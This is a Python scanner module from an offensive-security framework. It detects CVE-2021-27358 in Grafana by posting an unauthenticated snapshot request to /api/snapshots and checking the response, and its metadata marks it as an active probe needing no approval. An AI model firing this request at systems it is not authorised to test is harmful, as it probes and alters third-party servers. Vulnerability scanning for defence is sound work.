#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grafana 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grafana Unauthenticated Snapshot Creation Detection',
        'description': 'Grafana 6.7.3 through 7.4.1 snapshot functionality can allow an unauthenticated remote attacker to trigger a Denial of Service via a remote API call if a commonly used configuration is set.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'grafana', 'unauth', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://phabricator.wikimedia.org/T274736',
            'https://grafana.com/docs/grafana/latest/release-notes/release-notes-7-4-2/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27358',
            'https://github.com/grafana/grafana/blob/master/CHANGELOG.md',
            'https://github.com/grafana/grafana/blob/master/CHANGELOG.md#742-2021-02-17',
        ],
        'cve': 'CVE-2021-27358',
    }

    def run(self):
        path = '/api/snapshots'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"deleteUrl":', '"deleteKey":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Grafana Unauthenticated Snapshot Creation detected', path=path)
            return True
        return False

